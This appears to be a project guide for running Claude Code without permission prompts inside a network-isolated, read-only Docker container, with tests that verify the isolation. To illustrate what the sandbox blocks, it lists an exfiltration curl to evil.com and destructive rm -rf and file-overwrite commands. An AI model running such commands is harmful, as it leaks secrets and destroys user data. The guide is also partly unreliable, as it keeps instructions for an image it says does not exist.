# Docker Safe YOLO Setup Guide

**Created:** 2025-10-29
**Purpose:** Secure Docker configuration for Claude Code Safe YOLO mode

---

## ⚠️ RECOMMENDED USAGE APPROACH

**After testing and evaluation, here's what we recommend:**

### ✅ Use Normal Claude Code For:
- **Interactive development** (your primary workflow)
- **All bidding/play logic changes** (needs file modification)
- **Git operations** (commits, branches, PRs)
- **Installing dependencies** (needs network and write access)
- **Daily coding tasks** (highest productivity)

### 🐳 Use Docker For:
- **Running automated tests** in CI/CD pipelines
- **Linting in isolation** (if you want extra safety)
- **Specific tools** that benefit from containerization
- **Future needs** as they arise

### 🚫 Do NOT Use Docker Safe YOLO For:
- **General Claude Code usage** - Anthropic hasn't published a `claude-code` Docker image
- **File modifications** - Read-only filesystem prevents actual coding
- **Network operations** - Network isolation blocks API calls

**Bottom Line:** Keep Docker installed for future flexibility, but use normal Claude Code for your daily development work. The security Docker provides isn't necessary for trusted code development.

---

## What is Safe YOLO Mode?

**Safe YOLO Mode** = Claude Code runs commands **without asking permission** but in a **secure isolated container**

**Use Cases:**
- Fixing lint errors (read-only analysis)
- Generating boilerplate code
- Analyzing code patterns
- Running tests automatically
- Code review suggestions

**NOT for:**
- Installing dependencies
- Modifying files (read-only mount)
- Making git commits
- Network operations
- Production deployments

---

## Security Features

### 🔒 Maximum Security Configuration

| Feature | Implementation | Risk Mitigated |
|---------|---------------|----------------|
| **Network Isolation** | `--network none` | Data exfiltration via HTTP |
| **Read-Only Filesystem** | `-v project:ro` | File modification |
| **Resource Limits** | `--cpus=2.0 --memory=4g` | Resource exhaustion |
| **No Privileges** | `--security-opt=no-new-privileges` | Privilege escalation |
| **Temporary FS** | `--tmpfs /tmp:noexec` | Malicious code execution |
| **Container Isolation** | Standard Docker | Container escape |

**Overall Risk Level:** ⚠️ **LOW** (suitable for untrusted code execution)

---

## Quick Start

### Option 1: Using the Script (Recommended)

```bash
# Make sure you're in project root
cd /Users/simonroy/Desktop/bridge_bidding_app

# Run the secure script
./.claude/docker-safe-yolo.sh "Fix all lint errors in backend/"
```

**What it does:**
1. ✅ Checks Docker is running
2. ✅ Pulls image if needed
3. ✅ Asks for confirmation
4. ✅ Runs in isolated container
5. ✅ Removes container when done
6. ✅ Shows results

### Option 2: Manual Docker Command

```bash
docker run \
  --name claude-code-safe-yolo \
  --rm \
  --interactive \
  --tty \
  --network none \
  --cpus="2.0" \
  --memory="4g" \
  --security-opt=no-new-privileges \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=1g \
  -v "$(pwd):/workspace:ro" \
  -w /workspace \
  anthropics/claude-code:latest \
  claude --dangerously-skip-permissions -p "Fix lint errors"
```

---

## Setup Steps

### Step 1: Verify Docker is Running

```bash
docker info
```

**Expected:** Docker daemon information displays

**If error:** Start Docker Desktop

---

### Step 2: Pull Claude Code Image (First Time)

⚠️ **IMPORTANT DISCOVERY:** The `anthropics/claude-code:latest` Docker image does not exist publicly.

**What this means:**
- Anthropic has not published an official Claude Code Docker image
- You would need to build a custom image (not recommended - adds complexity)
- Docker is still useful for other tools (pytest, linting, etc.)

**Alternatives:**
1. **Use normal Claude Code** (recommended for development)
2. **Use Docker for specific tools** (pytest, ruff, etc. in containers)
3. **Build custom image** (only if you have specific isolation requirements)

**For testing purposes, we use Alpine Linux:**
```bash
# Pull a lightweight Linux image for tests
docker pull alpine:latest

# Verify it downloaded
docker images | grep alpine
```

---

### Step 3: Test the Setup

```bash
# Run a simple test
./.claude/docker-safe-yolo.sh "List all Python files in backend/"
```

**Expected:**
- Security configuration displayed
- Confirmation prompt
- Claude executes and shows output
- Container removed automatically

---

## Verifying VS Code Docker Extension

### Option 1: Visual Check

1. Open VS Code
2. Press `Cmd+Shift+X` (Extensions)
3. Search for "Docker"
4. Look for: **Docker** by Microsoft
   - ID: `ms-azuretools.vscode-docker`
   - Status: Should show "Installed"

### Option 2: Command Line Check

```bash
# List installed VS Code extensions
code --list-extensions | grep docker

# Or full path on macOS
/Applications/Visual\ Studio\ Code.app/Contents/Resources/app/bin/code \
  --list-extensions | grep docker
```

**Expected:** `ms-azuretools.vscode-docker`

### Option 3: Install if Missing

**Via VS Code:**
1. Press `Cmd+Shift+X`
2. Search "Docker"
3. Click "Install" on Docker by Microsoft

**Via Command Line:**
```bash
code --install-extension ms-azuretools.vscode-docker
```

**Via Settings Sync:**
- If you use Settings Sync, extensions sync automatically

---

## Test Container with Secure Settings

### Test 1: Verify Network Isolation

```bash
# Test that container has NO internet access
docker run \
  --rm \
  --network none \
  alpine:latest \
  ping -c 1 8.8.8.8

# Expected: "bad address '8.8.8.8'" or "Network is unreachable"
# This proves internet is blocked ✅
```

### Test 2: Verify Read-Only Filesystem

```bash
# Test that files cannot be modified
docker run \
  --rm \
  --network none \
  -v "$(pwd):/workspace:ro" \
  -w /workspace \
  alpine:latest \
  touch /workspace/test.txt

# Expected: "Read-only file system" error ✅
```

### Test 3: Verify Resource Limits

```bash
# Test CPU and memory limits
docker run \
  --rm \
  --cpus="0.5" \
  --memory="512m" \
  --network none \
  alpine:latest \
  sh -c "cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us"

# Expected: Shows CPU quota (not unlimited) ✅
```

### Test 4: Full Secure Configuration Test

```bash
# Run full security test
docker run \
  --name security-test \
  --rm \
  --network none \
  --cpus="1.0" \
  --memory="1g" \
  --security-opt=no-new-privileges \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=100m \
  -v "$(pwd):/workspace:ro" \
  alpine:latest \
  sh -c "
    echo '=== Security Test ==='
    echo 'Network: Testing...'
    ping -c 1 8.8.8.8 2>&1 | grep -q 'bad address' && echo '✓ Network isolated' || echo '✗ Network NOT isolated'
    echo 'Filesystem: Testing...'
    touch /workspace/test 2>&1 | grep -q 'Read-only' && echo '✓ Filesystem read-only' || echo '✗ Filesystem writable'
    echo 'Temp: Testing...'
    touch /tmp/test && rm /tmp/test && echo '✓ Temp filesystem works' || echo '✗ Temp filesystem failed'
    echo 'Privileges: Testing...'
    cat /proc/1/status | grep NoNewPrivs | grep -q 1 && echo '✓ No new privileges' || echo '✗ Privileges enabled'
    echo 'Complete!'
  "
```

**Expected Output:**
```
=== Security Test ===
Network: Testing...
✓ Network isolated
Filesystem: Testing...
✓ Filesystem read-only
Temp: Testing...
✓ Temp filesystem works
Privileges: Testing...
✓ No new privileges
Complete!
```

---

## Usage Examples

### Example 1: Fix Lint Errors

```bash
./.claude/docker-safe-yolo.sh "Fix all lint errors in backend/ and show me what would be fixed"
```

**Result:** Claude analyzes code and suggests fixes (read-only, safe)

### Example 2: Generate Boilerplate

```bash
./.claude/docker-safe-yolo.sh "Generate a REST API endpoint template for user authentication"
```

**Result:** Claude generates code template (outputs to stdout)

### Example 3: Code Review

```bash
./.claude/docker-safe-yolo.sh "Review backend/engine/bidding_engine.py for code quality issues"
```

**Result:** Claude provides code review suggestions

### Example 4: Run Tests

```bash
./.claude/docker-safe-yolo.sh "Run pytest on backend/tests/unit/ and show me the results"
```

**Result:** Claude runs tests and shows output

---

## Troubleshooting

### Issue: "Cannot connect to Docker daemon"

**Solution:**
```bash
# Start Docker Desktop
open -a Docker

# Wait 30 seconds for it to start
sleep 30

# Verify it's running
docker info
```

### Issue: "Image not found"

**Solution:**
```bash
# Pull the image manually
docker pull anthropics/claude-code:latest

# Or let the script pull it automatically
./.claude/docker-safe-yolo.sh "test"
```

### Issue: "Permission denied: .claude/docker-safe-yolo.sh"

**Solution:**
```bash
# Make script executable
chmod +x .claude/docker-safe-yolo.sh

# Verify
ls -l .claude/docker-safe-yolo.sh
```

### Issue: "Container name already in use"

**Solution:**
```bash
# Remove old container
docker rm -f claude-code-safe-yolo

# Or the script does this automatically
```

### Issue: Script runs but no output

**Check:**
- Is Docker running? `docker info`
- Is image downloaded? `docker images | grep claude-code`
- Are you in project root? `pwd`
- Does task make sense? Try simpler task first

---

## Understanding the Configuration

### Network: `--network none`

**What it does:** Completely isolates container from all networks

**Why:** Prevents data exfiltration via HTTP/HTTPS/DNS

**Trade-off:** Cannot fetch URLs, make API calls, or access internet

**Example blocked:**
```bash
curl https://evil.com/exfiltrate?data=secrets  # BLOCKED ✅
```

### Filesystem: `-v $(pwd):/workspace:ro`

**What it does:** Mounts project as read-only

**Why:** Prevents file modification, data loss, malicious changes

**Trade-off:** Cannot write files, install packages, or modify code

**Example blocked:**
```bash
rm -rf /workspace  # BLOCKED ✅
echo "malicious" > /workspace/file.py  # BLOCKED ✅
```

### Resources: `--cpus="2.0" --memory="4g"`

**What it does:** Limits CPU to 2 cores, RAM to 4GB

**Why:** Prevents resource exhaustion, system slowdown

**Trade-off:** May run slower on large tasks

**Example mitigated:**
```python
# Infinite loop won't freeze your system
while True:
    pass  # Uses max 2 CPUs ✅
```

### Security: `--security-opt=no-new-privileges`

**What it does:** Prevents privilege escalation

**Why:** Container can't gain root access or escape

**Trade-off:** None (should always use)

### Temporary FS: `--tmpfs /tmp:rw,noexec,nosuid`

**What it does:** Writeable /tmp but no executable permissions

**Why:** Can write temporary files but can't execute malicious code

**Trade-off:** None (best practice)

---

## Security Comparison

### Without Docker (Normal Mode)

| Aspect | Status | Risk |
|--------|--------|------|
| Network Access | ✅ Full | High (data exfiltration) |
| File System | ✅ Full | High (data loss) |
| Resources | ✅ Unlimited | Medium (system slowdown) |
| Isolation | ❌ None | High (full system access) |

### With Docker (Safe YOLO Mode)

| Aspect | Status | Risk |
|--------|--------|------|
| Network Access | ❌ None | ✅ Low (blocked) |
| File System | ❌ Read-only | ✅ Low (protected) |
| Resources | ⚠️ Limited | ✅ Low (2 CPU, 4GB) |
| Isolation | ✅ Full | ✅ Low (containerized) |

---

## When to Use Safe YOLO Mode

### ✅ Good Use Cases

- **Lint fixing** - Read-only analysis and suggestions
- **Code generation** - Templates and boilerplate (stdout)
- **Code review** - Analysis and recommendations
- **Test running** - Execute tests, view results
- **Pattern analysis** - Search and identify patterns
- **Documentation** - Generate docs from code

### ❌ Not Suitable For

- **Installing packages** - No network, read-only filesystem
- **Making git commits** - Read-only filesystem
- **Modifying files** - Read-only filesystem
- **Deploying** - No network access
- **Database migrations** - Need write access
- **Building projects** - Need write access for build artifacts

---

## Files Created

1. **`.claude/docker-safe-yolo.sh`** (executable script)
   - Main entry point
   - Security checks
   - User-friendly prompts
   - Automatic cleanup

2. **`.claude/docker-safe-yolo.json`** (configuration)
   - Docker settings
   - Security features
   - Risk assessment
   - Usage guidelines

3. **`.claude/DOCKER_SETUP_GUIDE.md`** (this file)
   - Complete documentation
   - Setup instructions
   - Usage examples
   - Troubleshooting

---

## Next Steps

1. ✅ **Verify Docker is running:** `docker info`
2. ✅ **Test the setup:** `./.claude/docker-safe-yolo.sh "echo Hello"`
3. ✅ **Verify VS Code extension:** Open VS Code → Extensions → Search "Docker"
4. ✅ **Run security tests:** See "Test Container with Secure Settings" section
5. 📝 **Try a real task:** Use for lint fixing or code review
6. 📝 **Read limitations:** Understand what Safe YOLO can and cannot do

---

## Support

**Questions?**
- Read this guide thoroughly
- Check troubleshooting section
- Review security features
- Test with simple tasks first

**Need help?**
- Verify Docker is running
- Check image is downloaded
- Ensure script is executable
- Try manual docker command

---

**Remember:** Safe YOLO mode is for **read-only** tasks in an **isolated environment**. It's secure but limited. For tasks requiring file modifications, use normal Claude Code mode with supervision.

---

## 🎯 Practical Recommendations After Testing

### What We Learned:
1. ✅ **Docker security features work perfectly** (network isolation, read-only FS, resource limits)
2. ✅ **VS Code Docker extension is installed and working**
3. ❌ **No official Claude Code Docker image exists**
4. ✅ **Docker is still useful for other purposes**

### Recommended Setup:
1. **Keep Docker installed** - Useful for tests, CI/CD, future needs (no harm in keeping it)
2. **Keep VS Code Docker extension** - Provides useful container management UI (zero overhead)
3. **Use normal Claude Code** for daily development (highest productivity)
4. **Use Docker containers** for specific tools when isolation is valuable:
   ```bash
   # Example: Run pytest in container
   docker run --rm -v "$(pwd):/app:ro" python:3.9 pytest /app/backend/tests/

   # Example: Run linting in container
   docker run --rm -v "$(pwd):/app:ro" python:3.9 ruff check /app/backend/
   ```

### Cleaning Up Docker (Optional):
If you want to reclaim disk space from unused images:
```bash
# Remove all unused images (safe - won't affect running containers)
docker system prune -a

# Remove specific image
docker rmi alpine:latest
```

**Our Recommendation:** Keep Docker and the extension installed. They provide flexibility for future needs and the disk space cost is minimal compared to the potential benefits.
